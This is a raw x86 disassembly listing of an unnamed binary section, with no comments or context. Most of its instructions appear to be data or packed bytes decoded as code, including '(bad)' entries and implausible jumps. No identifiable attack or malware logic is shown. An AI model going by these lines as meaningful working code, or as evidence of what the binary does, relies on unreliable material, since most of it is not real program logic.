  4136cd:	inc    ebx
  4136ce:	add    BYTE PTR [eax+0x78],al
  4136d1:	inc    ecx
  4136d2:	add    BYTE PTR [eax+0x41],bl
  4136d5:	bound  ebp,QWORD PTR [ebx-0x8]
  4136d8:	xchg   DWORD PTR [ebp+0x3fe56428],esi
  4136de:	adc    esi,esp
  4136e0:	mov    edi,0x4c6763ca
  4136e5:	fwait
  4136e6:	arpl   WORD PTR ds:0xf0a0e14c,dx
  4136ec:	cmp    eax,0x4b0191
  4136f1:	xor    esi,DWORD PTR [ebx]
  4136f3:	fs enter 0x8462,0xff
  4136f8:	and    DWORD PTR [ebx-0x71ba09be],esi
  4136fe:	nop
  4136ff:	cli    
  413700:	jg     0x413721
  413702:	mov    ds:0xbfd83198,al
  413707:	in     al,0x2
  413709:	daa    
  41370a:	push   ss
  41370b:	imul   eax,DWORD PTR gs:[ebx],0xcc008440
  413712:	bound  eax,QWORD PTR ds:0xcc840f41
  413718:	inc    ebx
  413719:	add    BYTE PTR [eax+0x0],al
  41371c:	inc    eax
  41371d:	inc    eax
  41371e:	inc    eax
  41371f:	int3   
  413720:	add    BYTE PTR ds:0x62404341,al
  413726:	pop    eax
  413727:	add    BYTE PTR [ebx+0x40],al
  41372a:	bound  ecx,QWORD PTR [edi]
  41372c:	inc    eax
  41372d:	ins    BYTE PTR es:[edi],dx
  41372e:	or     eax,0x5343512f
  413733:	fmul   st,st(4)
  413735:	add    BYTE PTR [ebx+0x4f],cl
  413738:	loop   0x4136de
  41373a:	rcl    BYTE PTR ds:0x81df414f,1
  413740:	push   ecx
  413741:	sub    ecx,DWORD PTR [esi]
  413743:	dec    ebp
  413744:	jmp    0x83ea:0xff493749
  41374b:	ss iret 
  41374d:	and    cl,bh
  41374f:	adc    BYTE PTR [ecx+0x0],0x0
  413753:	inc    eax
  413754:	inc    eax
  413755:	cmovno eax,DWORD PTR ds:0x40056243
  41375c:	int3   
  41375d:	add    ah,cl
  41375f:	inc    eax
  413760:	inc    eax
  413761:	bound  eax,QWORD PTR [ecx+0x0]
  413764:	add    BYTE PTR [edi],cl
  413766:	inc    ebx
  413767:	inc    eax
  413768:	inc    eax
  413769:	add    BYTE PTR [ecx+0x43],al
  41376c:	add    eax,0x40256240
  413771:	bound  eax,QWORD PTR [eax]
  413773:	add    al,0xa8
  413775:	(bad)  
  413776:	push   edx
  413777:	and    eax,0x61ff2390
  41377c:	adc    dh,dh
  41377e:	inc    eax
  41377f:	test   al,0x5
  413781:	stc    
  413782:	push   ecx
  413783:	dec    ebp
  413784:	pushf  
  413785:	mov    ebp,0x2d411201
  41378a:	jmp    DWORD PTR [ebx]
  41378c:	add    eax,0x75a8a9d4
  413791:	in     eax,dx
  413792:	jle    0x4137fc
  413794:	retf   
  413795:	mov    ecx,DWORD PTR [ecx+eax*2-0x1c4113d0]
  41379c:	inc    esp
  41379d:	mov    eax,ds:0x838e647d
  4137a2:	push   ss
  4137a3:	pop    ecx
  4137a4:	sub    dl,dl
  4137a6:	sar    esp,0x5
  4137a9:	add    ah,cl
  4137ab:	inc    eax
  4137ac:	inc    ecx
  4137ad:	inc    eax
  4137ae:	inc    ebx
  4137af:	bound  esp,QWORD PTR ds:0x41400043
  4137b5:	add    BYTE PTR [eax],al
  4137b7:	add    eax,0x43624062
  4137bc:	inc    ecx
  4137bd:	inc    eax
  4137be:	inc    eax
  4137bf:	inc    eax
  4137c0:	add    eax,0x40624340
  4137c5:	add    eax,0x40664140
  4137ca:	adc    eax,0x74a53f85
  4137cf:	imul   eax,DWORD PTR [eax+0x4],0x41
  4137d3:	test   BYTE PTR [ebp+0x41],bl
  4137d6:	arpl   WORD PTR [ecx+0x14e28c40],si
  4137dc:	loop   0x4137bf
  4137de:	sti    
  4137df:	rol    BYTE PTR [ecx+0x63],1
  4137e2:	cli    
  4137e3:	adc    BYTE PTR [esi+0x66],ch
  4137e6:	lods   al,BYTE PTR ds:[esi]
  4137e7:	inc    ebx
  4137e8:	hlt    
  4137e9:	inc    edx
  4137ea:	mov    WORD PTR [ebx-0x569d1cae],es
  4137f0:	test   al,0xec
  4137f2:	or     eax,0xab772060
  4137f7:	into   
  4137f8:	inc    ebp
  4137f9:	cwde   
  4137fa:	dec    ebx
  4137fb:	add    al,0x2d
  4137fd:	pusha  
  4137fe:	mov    WORD PTR [ebx+0x36f30535],cs
  413804:	dec    ebx
  413805:	aaa    
  413806:	inc    ebx
  413807:	add    BYTE PTR ds:0x41107840,al
  41380d:	bound  eax,QWORD PTR [eax+0x40]
  413810:	sldt   WORD PTR [eax-0x34]
  413814:	js     0x413878
  413816:	add    eax,0x40664143
  41381b:	inc    ebx
  41381c:	add    BYTE PTR [ecx+0x5],al
  41381f:	js     0x413861
  413821:	bound  eax,QWORD PTR [eax+0x0]
  413824:	inc    eax
  413825:	push   ebp
  413826:	mov    eax,ds:0x12f98740
  41382b:	and    bh,BYTE PTR [esi-0x6fbf33d2]
  413831:	mov    al,BYTE PTR [ecx+0x5b48546e]
  413837:	add    DWORD PTR ds:0x6b4d4705,ecx
  41383d:	cmp    BYTE PTR [ebp+0x40404341],ah
  413843:	add    eax,0x434162
  413848:	inc    eax
  413849:	add    BYTE PTR [edx+0x5],ah
  41384c:	inc    eax
  41384d:	adc    BYTE PTR [edx+0x40],ah
  413850:	inc    ebx
  413851:	inc    ecx
  413852:	add    eax,0x4340
  413857:	add    eax,0x404162
  41385c:	add    BYTE PTR [eax+0x43],al
  41385f:	inc    eax
  413860:	add    eax,0x74dc9a0
  413865:	stos   DWORD PTR es:[edi],eax
  413866:	push   esp
  413867:	nop
  413868:	retf   0xa048
  41386b:	out    dx,eax
  41386c:	fwait
  41386d:	xchg   ebp,eax
  41386e:	daa    
  41386f:	push   ebp
  413870:	xchg   ecx,edi
  413872:	or     eax,0xcf4574f8
  413877:	int    0xb5
  413879:	ret    
  41387a:	int    0x88
  41387c:	add    DWORD PTR [ebx+0x40c859a2],esp
  413882:	inc    esi
  413883:	adc    eax,0x6c01428e
  413888:	push   edi
  413889:	mov    BYTE PTR [eax+0x4d],ah
  41388c:	add    esp,DWORD PTR [eax+0x56]
  41388f:	adc    DWORD PTR [ecx+0x8fb782b],edi
  413895:	xor    eax,DWORD PTR [eax+0x0]
  413898:	add    BYTE PTR [ecx+0x43],al
  41389b:	add    eax,0x41784062
  4138a0:	inc    eax
  4138a1:	inc    eax
  4138a2:	add    BYTE PTR [edi],cl
  4138a4:	bound  eax,QWORD PTR [ebx+0x0]
  4138a7:	add    eax,0x25006240
  4138ac:	inc    eax
  4138ad:	add    eax,0x40254143
  4138b2:	add    eax,0x21620000
  4138b7:	arpl   WORD PTR [edx],sp
  4138b9:	inc    ebp
  4138ba:	push   edx
  4138bb:	cli    
  4138bc:	add    DWORD PTR [edx+0x0],0x9440355f
  4138c3:	xchg   BYTE PTR [eax-0x55],al
  4138c6:	sti    
  4138c7:	stos   DWORD PTR es:[edi],eax
  4138c8:	inc    esp
  4138c9:	daa    
  4138ca:	add    eax,0x4344000d
  4138cf:	add    BYTE PTR [eax],al
  4138d1:	add    BYTE PTR [ecx+0x40],al
  4138d4:	bound  esp,QWORD PTR [esi+0x0]
  4138d7:	inc    eax
  4138d8:	add    eax,0x5400000
  4138dd:	inc    ecx
  4138de:	inc    eax
  4138df:	inc    eax
  4138e0:	bound  esp,QWORD PTR ds:0x25050043
  4138e6:	inc    ecx
  4138e7:	inc    ebx
  4138e8:	inc    eax
  4138e9:	test   BYTE PTR [eax+0x0],al
  4138ec:	bound  ebx,QWORD PTR [eax+0x62]
  4138ef:	inc    ecx
  4138f0:	inc    eax
  4138f1:	or     DWORD PTR [edx+0x52],edx
  4138f4:	jl     0x41387d
  4138f6:	dec    esi
  4138f7:	and    ah,al
  4138f9:	jmp    0x413921
  4138fb:	mul    DWORD PTR [edx-0x39]
  4138fe:	out    0x42,eax
  413900:	daa    
  413901:	push   ebx
  413902:	jecxz  0x413951
  413904:	clc    
  413905:	xor    edi,ecx
  413907:	add    BYTE PTR [edx+0x27],al
  41390a:	mov    ah,0x5e
  41390c:	push   eax
  41390d:	mov    WORD PTR [eax+esi*1+0x3105af21],es
  413914:	outs   dx,DWORD PTR ds:[esi]
  413915:	fs add eax,0x52424252
  41391b:	dec    esi
  41391c:	(bad)  
  41391e:	dec    esi
  41391f:	xchg   eax,esp
  413921:	and    ecx,ebx
  413923:	cmp    al,0xd7
  413925:	pop    eax
  413926:	repz adc BYTE PTR [edx+0x40],ah
  41392a:	inc    ecx
  41392b:	and    eax,0x40000500
  413930:	inc    ebx
  413931:	add    eax,0x40624041
  413936:	inc    ebx
  413937:	add    eax,0x43402541
  41393c:	bound  eax,QWORD PTR [eax-0x34]
  41393f:	int3   
  413940:	mov    edx,ecx
  413942:	mov    ebx,DWORD PTR [ebp-0x10]
  413945:	xor    eax,eax
  413947:	inc    edx
  413948:	mov    ecx,DWORD PTR [edx]
  41394a:	inc    eax
  41394b:	inc    cl
  41394d:	dec    cl
  41394f:	jne    0x413947
  413951:	dec    eax
  413952:	ret    
  413953:	int3   
  413954:	jmp    DWORD PTR ds:0x421038
  41395a:	int3   
  41395b:	int3   
  41395c:	int3   
  41395d:	int3   
  41395e:	int3   
  41395f:	int3   
  413960:	mov    ebx,ecx
  413962:	xor    eax,ebx
  413964:	jmp    0x41ceea
  413969:	int3   
  41396a:	int3   
  41396b:	int3   
  41396c:	int3   
  41396d:	int3   
  41396e:	int3   
  41396f:	int3   
  413970:	push   0x1c
  413972:	adc    bh,cl
  413974:	retf   
  413975:	pusha  
  413976:	mov    ebp,0x41586240
  41397b:	add    eax,0x40404340
  413980:	inc    ebx
  413981:	inc    eax
  413982:	test   BYTE PTR [eax],al
  413984:	add    eax,0x40624041
  413989:	inc    eax
  41398a:	add    BYTE PTR [edx+0x5],ah
  41398d:	inc    ebx
  41398e:	add    BYTE PTR [eax+0x78],al
  413991:	inc    ecx
  413992:	add    BYTE PTR [eax+0x41],bl
  413995:	bound  ebp,QWORD PTR [ecx+0x17b86c48]
  41399b:	aas    
  41399c:	sar    BYTE PTR [edi+0x56280b4],1
  4139a2:	cs push ebp
  4139a4:	inc    eax
  4139a5:	mov    edi,0xcdc0525d
  4139aa:	leave  
  4139ab:	push   esi
  4139ac:	add    edi,DWORD PTR [ebp+0x4045bc3f]
  4139b2:	jmp    0x6e9d79ca
  4139b7:	dec    eax
  4139b8:	and    eax,0x95b4946
  4139bd:	inc    ecx
  4139be:	mov    edi,0x11723e81
  4139c3:	pop    ds
  4139c4:	inc    eax
  4139c5:	or     edx,DWORD PTR [ebp+0x44]
  4139c8:	leave  
  4139c9:	hlt    
  4139ca:	shl    DWORD PTR [esi+0x16],1
  4139cd:	inc    eax
  4139ce:	test   BYTE PTR [eax],al
  4139d0:	int3   
  4139d1:	bound  eax,QWORD PTR ds:0xcc840f41
  4139d7:	inc    ebx
  4139d8:	add    BYTE PTR [eax+0x0],al
  4139db:	inc    eax
  4139dc:	inc    eax
  4139dd:	inc    eax
  4139de:	int3   
  4139df:	add    BYTE PTR ds:0x62404341,al
  4139e5:	pop    eax
  4139e6:	add    BYTE PTR [ebx+0x40],al
  4139e9:	bound  ecx,QWORD PTR [edi]
  4139eb:	inc    eax
  4139ec:	mov    esp,0x62f950bd
  4139f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f2:	ja     0x413a34
  4139f4:	mov    edi,0x4688b869
  4139f9:	push   es
  4139fa:	test   DWORD PTR [edx],edx
  4139fc:	mov    edi,0x240d077d
  413a01:	es jae 0x4139c4
  413a04:	mov    ebp,0x40cdc9dc
  413a09:	xchg   esp,eax
  413a0a:	dec    esp
  413a0b:	inc    eax
  413a0c:	pop    edx
  413a0d:	push   esi
  413a0e:	or     dl,BYTE PTR [eax]
  413a10:	xchg   BYTE PTR [edx+edx*4],ch
  413a13:	add    eax,0xd8445841
  413a18:	test   eax,0x6740afdd
  413a1d:	addr16 mov ds:0x0,eax
  413a21:	inc    eax
  413a22:	inc    eax
  413a23:	cmovno eax,DWORD PTR ds:0x40056243
  413a2a:	int3   
  413a2b:	add    ah,cl
  413a2d:	inc    eax
  413a2e:	inc    eax
  413a2f:	bound  eax,QWORD PTR [ecx+0x0]
  413a32:	add    BYTE PTR [edi],cl
  413a34:	inc    ebx
  413a35:	inc    eax
  413a36:	inc    eax
  413a37:	add    BYTE PTR [ecx+0x43],al
  413a3a:	add    eax,0x40256240
  413a3f:	bound  eax,QWORD PTR [eax]
  413a41:	add    eax,0x132836b4
  413a46:	mov    esp,0x41432241
  413a4b:	bound  ebx,QWORD PTR [edi+0x40]
  413a4e:	mov    edi,0x372953ec
  413a53:	leave  
  413a54:	mov    bh,0x65
  413a56:	mov    edi,0xfcb8cd5c
  413a5b:	push   ecx
  413a5c:	adc    BYTE PTR [eax-0x43],al
  413a5f:	sbb    al,0xc8
  413a61:	arpl   WORD PTR [edi-0x4f],sp
  413a64:	xor    eax,0x532d5860
  413a69:	xor    ebx,DWORD PTR [edx]
  413a6b:	dec    esp
  413a6c:	adc    eax,DWORD PTR [eax+0x41]
  413a6f:	inc    esi
  413a70:	push   edx
  413a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a72:	je     0x413a32
  413a74:	std    
  413a75:	cmc    
  413a76:	mov    DWORD PTR ds:0x4140cc00,0x25624340
  413a80:	inc    ebx
  413a81:	add    BYTE PTR [eax+0x41],al
  413a84:	add    BYTE PTR [eax],al
  413a86:	add    eax,0x43624062
  413a8b:	inc    ecx
  413a8c:	inc    eax
  413a8d:	inc    eax
  413a8e:	inc    eax
  413a8f:	add    eax,0x40624340
  413a94:	add    eax,0x40664140
  413a99:	nop
  413a9a:	test   BYTE PTR [edx+0x63],ah
  413a9d:	stos   DWORD PTR es:[edi],eax
  413a9e:	pop    ds
  413a9f:	xor    DWORD PTR [eax+0xe402968],ebp
  413aa5:	mov    esi,0xa85046b3
  413aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aab:	mov    al,ds:0xf0ff71fc
  413ab0:	arpl   WORD PTR [ecx],dx
  413ab2:	push   edx
  413ab3:	imul   ebp,DWORD PTR [ebx-0x23],0x488d6993
  413aba:	(bad)  
  413abb:	sbb    esi,DWORD PTR [ecx]
  413abd:	cmp    al,0x82
  413abf:	push   ebx
  413ac0:	bound  ecx,QWORD PTR [eax]
  413ac2:	je     0x413b38
  413ac4:	pushf  
  413ac5:	sub    BYTE PTR [ebx-0x6d],dh
  413ac8:	cmp    eax,0x6462accb
  413acd:	rol    BYTE PTR [ebx+0x0],cl
  413ad0:	add    eax,0x41107840
  413ad5:	bound  eax,QWORD PTR [eax+0x40]
  413ad8:	sldt   WORD PTR [eax-0x34]
  413adc:	js     0x413b40
  413ade:	add    eax,0x40664143
  413ae3:	inc    ebx
  413ae4:	add    BYTE PTR [ecx+0x5],al
  413ae7:	js     0x413b29
  413ae9:	bound  eax,QWORD PTR [eax+0x0]
  413aec:	inc    eax
  413aed:	inc    bp
  413aef:	dec    ebx
  413af0:	inc    ebx
  413af1:	push   esp
  413af2:	inc    edi
  413af3:	cmp    DWORD PTR [edi-0x49],ebx
  413af6:	and    al,dl
  413af8:	setno  al
  413afb:	add    al,0xca
  413afd:	aas    
  413afe:	aad    0xea
  413b00:	cmp    al,0xbc
  413b02:	call   0xa2a80b69
  413b07:	bound  ecx,QWORD PTR [eax+0x15]
  413b0a:	test   al,0x40
  413b0c:	jmp    0x413acd
  413b0e:	lock adc eax,0xeb62cbc8
  413b14:	jmp    0xd05d9b7f
  413b19:	add    DWORD PTR [esi+0x21],ebp
  413b1c:	scas   eax,DWORD PTR es:[edi]
  413b1d:	mov    edi,0x40434145
  413b22:	inc    eax
  413b23:	add    eax,0x434162
  413b28:	inc    eax
  413b29:	add    BYTE PTR [edx+0x5],ah
  413b2c:	inc    eax
  413b2d:	adc    BYTE PTR [edx+0x40],ah
  413b30:	inc    ebx
  413b31:	inc    ecx
  413b32:	add    eax,0x4340
  413b37:	add    eax,0x404162
  413b3c:	add    BYTE PTR [eax+0x43],al
  413b3f:	inc    eax
  413b40:	add    eax,0x62424653
  413b45:	add    eax,0xcd3df04c
  413b4a:	and    eax,0x61874042
  413b4f:	xchg   ebp,eax
  413b50:	inc    ebp
  413b51:	adc    DWORD PTR [esp+edi*2],ebx
  413b54:	dec    edi
  413b55:	inc    eax
  413b56:	aam    0xd8
  413b58:	aas    
  413b59:	pop    eax
  413b5a:	test   al,0x6c
  413b5c:	inc    eax
  413b5d:	inc    eax
  413b5e:	fcom   st(1)
  413b60:	inc    ebp
  413b61:	xor    dl,BYTE PTR [ecx]
  413b63:	xor    al,0x5f
  413b65:	inc    edx
  413b66:	dec    ebx
  413b67:	inc    esi
  413b68:	aas    
  413b69:	int    0x48
  413b6b:	jl     0x413b95
  413b6d:	lock push ecx
  413b6f:	mov    cl,0x7f
  413b71:	int    0x41
  413b73:	sub    DWORD PTR [eax+0x0],eax
  413b76:	add    BYTE PTR [ecx+0x43],al
  413b79:	add    eax,0x41784062
  413b7e:	inc    eax
  413b7f:	inc    eax
  413b80:	add    BYTE PTR [edi],cl
  413b82:	bound  eax,QWORD PTR [ebx+0x0]
  413b85:	add    eax,0x25006240
  413b8a:	inc    eax
  413b8b:	add    eax,0x40254143
  413b90:	add    eax,0x42620000
  413b95:	inc    ebx
  413b96:	inc    edx
  413b97:	out    0x5f,eax
  413b99:	inc    eax
  413b9a:	xor    ah,BYTE PTR [edx+0x6e]
  413b9d:	inc    edi
  413b9e:	in     eax,0x19
  413ba0:	dec    esi
  413ba1:	sub    ch,BYTE PTR [ebx+eax*1]
  413ba4:	mov    al,0x84
  413ba6:	jp     0x413bef
  413ba8:	mov    edi,0x437541
  413bad:	add    BYTE PTR [eax],al
  413baf:	inc    ecx
  413bb0:	inc    eax
  413bb1:	bound  esp,QWORD PTR [esi+0x0]
  413bb4:	inc    eax
  413bb5:	add    eax,0x5400000
  413bba:	inc    ecx
  413bbb:	inc    eax
  413bbc:	inc    eax
  413bbd:	bound  esp,QWORD PTR ds:0x25050043
  413bc3:	inc    ecx
  413bc4:	inc    ebx
  413bc5:	inc    eax
  413bc6:	test   BYTE PTR [eax+0x0],al
  413bc9:	bound  ebx,QWORD PTR [eax+0x62]
  413bcc:	inc    ecx
  413bcd:	inc    eax
  413bce:	and    al,0x62
  413bd0:	inc    ebx
  413bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd2:	cmc    
  413bd3:	lahf   
  413bd4:	jo     0x413bcb
  413bd6:	push   edx
  413bd7:	inc    edx
  413bd8:	nop
  413bd9:	xor    dh,ch
  413bdb:	inc    edi
  413bdc:	push   eax
  413bdd:	cmp    eax,0x86f02a30
  413be2:	repz push ebx
  413be4:	push   edx
  413be5:	js     0x413bf7
  413be7:	inc    ecx
  413be8:	inc    ebx
  413be9:	mov    DWORD PTR [edi+0x643c3e06],edi
  413bef:	outs   dx,DWORD PTR ds:[esi]
  413bf0:	rol    esp,1
  413bf2:	int3   
  413bf3:	dec    esp
  413bf5:	gs mov bl,0xd3
  413bf8:	jmp    0x413c27
  413bfa:	xor    edx,DWORD PTR [eax]
  413bfc:	bound  eax,QWORD PTR [eax+0x41]
  413bff:	and    eax,0x40000500
  413c04:	inc    ebx
  413c05:	add    eax,0x40624041
  413c0a:	inc    ebx
  413c0b:	add    eax,0x43402541
  413c10:	bound  eax,QWORD PTR [eax+0x43]
  413c13:	int3   
  413c14:	inc    eax
  413c15:	bound  eax,QWORD PTR [eax]
  413c17:	inc    ecx
  413c18:	inc    eax
  413c19:	inc    eax
  413c1a:	add    eax,0x71700605
  413c1f:	lock bound esp,QWORD PTR [esi+0x5cff06c0]
  413c26:	xor    cl,ch
  413c28:	mov    ds:0x1bb37909,eax
  413c2d:	push   edx
  413c2e:	gs jl  0x413c55
  413c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c32:	jae    0x413c55
  413c34:	xlat   BYTE PTR ds:[ebx]
  413c35:	aad    0x63
  413c37:	test   eax,0x254062
  413c3c:	inc    ax
  413c3e:	add    eax,0x40404143
  413c43:	inc    ebx
  413c44:	add    BYTE PTR [eax],al
  413c46:	add    BYTE PTR [edx-0x34],ah
  413c49:	inc    eax
  413c4a:	add    eax,0x40004041
  413c4f:	inc    ecx
  413c50:	int3   
  413c51:	add    BYTE PTR [ebx-0x7c],al
  413c54:	add    eax,0x5406240
  413c59:	(bad)  
  413c5b:	inc    ecx
  413c5c:	add    eax,0xc8097b35
  413c61:	push   esp
  413c62:	lock inc ebx
  413c64:	mov    edi,0x35e1950b
  413c69:	inc    edx
  413c6a:	arpl   WORD PTR [eax],si
  413c6c:	icebp  
  413c6d:	repz inc eax
  413c6f:	cli    
  413c70:	inc    eax
  413c71:	bound  ebx,QWORD PTR [eax+0x41]
  413c74:	add    eax,0x40404340
  413c79:	inc    ebx
  413c7a:	inc    eax
  413c7b:	test   BYTE PTR [eax],al
  413c7d:	add    eax,0x40624041
  413c82:	inc    eax
  413c83:	add    BYTE PTR [edx+0x5],ah
  413c86:	inc    ebx
  413c87:	add    BYTE PTR [eax+0x78],al
  413c8a:	inc    ecx
  413c8b:	add    BYTE PTR [eax+0x41],bl
  413c8e:	bound  ebx,QWORD PTR ds:0x42ec697c
  413c94:	fs lock ins DWORD PTR es:[edi],dx
  413c97:	test   al,0x76
  413c99:	mov    al,0x47
  413c9b:	jp     0x413cae
  413c9d:	sub    DWORD PTR ds:0x8563635e,ecx
  413ca3:	push   ebx
  413ca4:	pop    ebx
  413ca5:	sbb    al,0x52
  413ca7:	aaa    
  413ca8:	jl     0x413c69
  413caa:	inc    ebx
  413cab:	adc    ecx,edx
  413cad:	ror    edi,1
  413caf:	nop
  413cb0:	lds    eax,FWORD PTR gs:[eax-0x7c]
  413cb4:	add    ah,cl
  413cb6:	bound  eax,QWORD PTR ds:0xcc840f41
  413cbc:	inc    ebx
  413cbd:	add    BYTE PTR [eax+0x0],al
  413cc0:	inc    eax
  413cc1:	inc    eax
  413cc2:	inc    eax
  413cc3:	int3   
  413cc4:	add    BYTE PTR ds:0x62404341,al
  413cca:	pop    eax
  413ccb:	add    BYTE PTR [ebx+0x40],al
  413cce:	bound  ecx,QWORD PTR [edi]
  413cd0:	inc    eax
  413cd1:	nop
  413cd2:	arpl   WORD PTR [ebx-0x43],bx
  413cd5:	mov    ah,0xbf
  413cd7:	jbe    0x413d28
  413cd9:	(bad)  
  413cda:	fnstenv [ecx+0x59]
  413cdd:	jo     0x413d23
  413cdf:	xor    al,0x63
  413ce1:	inc    ebx
  413ce2:	push   esi
  413ce3:	inc    edi
  413ce4:	xor    al,ah
  413ce6:	cmp    ch,BYTE PTR [eax+0x4b]
  413ce9:	add    BYTE PTR [eax],al
  413ceb:	inc    eax
  413cec:	inc    eax
  413ced:	cmovno eax,DWORD PTR ds:0x40056243
  413cf4:	int3   
  413cf5:	add    ah,cl
  413cf7:	inc    eax
  413cf8:	inc    eax
  413cf9:	bound  eax,QWORD PTR [ecx+0x0]
  413cfc:	add    BYTE PTR [edi],cl
  413cfe:	inc    ebx
  413cff:	inc    eax
  413d00:	inc    eax
  413d01:	add    BYTE PTR [ecx+0x43],al
  413d04:	add    eax,0x40256240
  413d09:	bound  eax,QWORD PTR [eax]
  413d0b:	rcr    DWORD PTR [esi+0x51],1
  413d0e:	xor    dl,BYTE PTR [edx-0x40]
  413d11:	(bad)  
  413d12:	bound  esp,QWORD PTR [edx+0x75]
  413d15:	mov    edi,0x1842d84e
  413d1a:	adc    eax,0x11485c0a
  413d1f:	test   al,0x21
  413d21:	arpl   ax,cx
  413d23:	ins    DWORD PTR es:[edi],dx
  413d24:	jb     0x413d97
  413d26:	push   ecx
  413d27:	jo     0x413cf7
  413d29:	mov    dh,0x63
  413d2b:	mov    dh,bl
  413d2d:	push   0x5d491
  413d32:	int3   
  413d33:	inc    eax
  413d34:	inc    ecx
  413d35:	inc    eax
  413d36:	inc    ebx
  413d37:	bound  esp,QWORD PTR ds:0x41400043
  413d3d:	add    BYTE PTR [eax],al
  413d3f:	add    eax,0x43624062
  413d44:	inc    ecx
  413d45:	inc    eax
  413d46:	inc    eax
  413d47:	inc    eax
  413d48:	add    eax,0x40624340
  413d4d:	add    eax,0x40664140
  413d52:	test   al,0x88
  413d54:	push   cs
  413d55:	inc    ecx
  413d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d57:	icebp  
  413d58:	add    dl,BYTE PTR [edx+0x4f]
  413d5b:	(bad)  
  413d5c:	fadd   QWORD PTR [ebx-0x6c]
  413d5f:	ins    DWORD PTR es:[edi],dx
  413d60:	cdq    
  413d61:	pop    edx
  413d62:	and    bh,BYTE PTR [edx+eiz*2-0x58ea5fd0]
  413d69:	mov    al,0x46
  413d6b:	mov    al,0x4b
  413d6d:	call   0x70b5ad30
  413d72:	fcom   QWORD PTR [ecx-0x4c05b8d0]
  413d78:	push   cs
  413d79:	aam    0x6c
  413d7b:	(bad)  
  413d7c:	in     al,dx
  413d7d:	test   eax,esp
  413d7f:	inc    edx
  413d80:	or     dl,BYTE PTR [edx+0x46]
  413d83:	imul   esp,DWORD PTR [ecx-0x444c8ea0],0xa864ddcd
  413d8d:	lock mov ds:0x40050043,eax
  413d93:	js     0x413da5
  413d95:	inc    ecx
  413d96:	bound  eax,QWORD PTR [eax+0x40]
  413d99:	sldt   WORD PTR [eax-0x34]
  413d9d:	js     0x413e01
  413d9f:	add    eax,0x40664143
  413da4:	inc    ebx
  413da5:	add    BYTE PTR [ecx+0x5],al
  413da8:	js     0x413dea
  413daa:	bound  eax,QWORD PTR [eax+0x0]
  413dad:	inc    eax
  413dae:	dec    edi
  413daf:	std    
  413db0:	inc    edx
  413db1:	fist   WORD PTR [ebx-0xb]
  413db4:	mov    ds:0xfd7f75bf,eax
  413db9:	xor    DWORD PTR [esi+0x5122aacb],esi
  413dbf:	fisttp WORD PTR [ebp-0x27]
  413dc2:	mov    BYTE PTR [edx-0x58],dl
  413dc5:	gs xchg ecx,eax
  413dc7:	dec    eax
  413dc8:	sub    al,0x51
  413dca:	bound  eax,QWORD PTR [eax+0x40]
  413dcd:	dec    edx
  413dce:	adc    esi,edi
  413dd0:	pushf  
  413dd1:	xor    eax,0xa82ac9b8
  413dd6:	sar    DWORD PTR [ecx+0x10],1
  413dd9:	pusha  
  413dda:	mov    al,0x28
  413ddc:	dec    esp
  413ddd:	add    BYTE PTR [edi+0x40404341],bh
  413de3:	add    eax,0x434162
  413de8:	inc    eax
  413de9:	add    BYTE PTR [edx+0x5],ah
  413dec:	inc    eax
  413ded:	adc    BYTE PTR [edx+0x40],ah
  413df0:	inc    ebx
  413df1:	inc    ecx
  413df2:	add    eax,0x4340
  413df7:	add    eax,0x404162
  413dfc:	add    BYTE PTR [eax+0x43],al
  413dff:	inc    eax
  413e00:	add    eax,0x357eb199
  413e05:	adc    BYTE PTR [edx],ch
  413e07:	mov    bl,0x8
  413e09:	add    al,0x70
  413e0b:	bound  esp,QWORD PTR [edx-0x10]
  413e0e:	dec    edx
  413e0f:	xchg   esi,eax
  413e10:	push   ecx
  413e11:	mov    edi,0x50675d4
  413e16:	lods   eax,DWORD PTR ds:[esi]
  413e17:	pushf  
  413e18:	inc    eax
  413e19:	dec    edi
  413e1a:	push   edx
  413e1b:	shl    BYTE PTR [ebp+ecx*8-0x404c6b8c],1
  413e22:	pop    es
  413e23:	bound  edx,QWORD PTR gs:[edx]
  413e26:	(bad)  
  413e27:	and    ebx,DWORD PTR [eax+0x46]
  413e2a:	nop
  413e2b:	pop    esp
  413e2c:	mov    esp,0x93d04890
  413e31:	cmp    BYTE PTR [esi+eiz*2+0x6],al
  413e35:	inc    edi
  413e36:	inc    ebx
  413e37:	dec    edi
  413e38:	fs push es
  413e3a:	sub    al,0xf8
  413e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3d:	inc    eax
  413e3e:	add    BYTE PTR [eax],al
  413e40:	inc    ecx
  413e41:	inc    ebx
  413e42:	add    eax,0x41784062
  413e47:	inc    eax
  413e48:	inc    eax
  413e49:	add    BYTE PTR [edi],cl
  413e4b:	bound  eax,QWORD PTR [ebx+0x0]
  413e4e:	add    eax,0x25006240
  413e53:	inc    eax
  413e54:	add    eax,0x40254143
  413e59:	add    eax,0xd620000
  413e5e:	xor    ch,bl
  413e60:	push   ecx
  413e61:	inc    edi
  413e62:	cwde   
  413e63:	and    BYTE PTR [ebx-0x7c],ah
  413e66:	shl    BYTE PTR [edi*2+0x39acd8f0],1
  413e6d:	fs inc edi
  413e6f:	stos   BYTE PTR es:[edi],al
  413e70:	aad    0xbd
  413e72:	test   eax,0x8537fc05
  413e77:	stos   DWORD PTR es:[edi],eax
  413e78:	sub    al,0x74
  413e7a:	cli    
  413e7b:	retf   
  413e7c:	gs js  0x413ec2
  413e7f:	nop
  413e80:	sti    
  413e81:	push   0xffffffe8
  413e83:	pop    eax
  413e84:	sub    ah,BYTE PTR [esi-0x70]
  413e87:	scas   eax,DWORD PTR es:[edi]
  413e88:	(bad)  
  413e8a:	bound  edx,QWORD PTR ds:0xf0476d37
  413e90:	adc    DWORD PTR [ebp-0x3b],ebp
  413e93:	inc    ebx
  413e94:	add    BYTE PTR [eax],al
  413e96:	add    BYTE PTR [ecx+0x40],al
  413e99:	bound  esp,QWORD PTR [esi+0x0]
  413e9c:	inc    eax
  413e9d:	add    eax,0x5400000
  413ea2:	inc    ecx
  413ea3:	inc    eax
  413ea4:	inc    eax
  413ea5:	bound  esp,QWORD PTR ds:0x25050043
  413eab:	inc    ecx
  413eac:	inc    ebx
  413ead:	inc    eax
  413eae:	test   BYTE PTR [eax+0x0],al
